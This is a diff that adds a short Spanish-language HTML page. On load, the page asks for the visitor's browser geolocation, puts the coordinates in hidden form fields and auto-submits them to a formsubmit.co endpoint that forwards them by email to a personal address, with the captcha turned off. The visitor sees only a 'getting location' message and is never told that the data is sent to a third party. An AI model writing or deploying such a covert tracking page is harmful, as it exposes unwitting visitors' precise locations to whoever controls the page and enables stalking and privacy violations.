@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Ubicación del visitante</title>
+</head>
+<body>
+  <h2>Obteniendo ubicación...</h2>
+
+  <form id="locationForm" method="POST" action="https://formsubmit.co/luisurielromerorosas@email.com">
+    <input type="hidden" name="latitud" id="latitud">
+    <input type="hidden" name="longitud" id="longitud">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Ubicación nueva desde GitHub Page">
+  </form>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(pos => {
+      document.getElementById('latitud').value = pos.coords.latitude;
+      document.getElementById('longitud').value = pos.coords.longitude;
+      document.getElementById('locationForm').submit();
+    }, err => {
+      document.body.innerHTML = "<h2>No se pudo obtener la ubicación. Verifica permisos.</h2>";
+    });
+  </script>
+</body>
+</html>
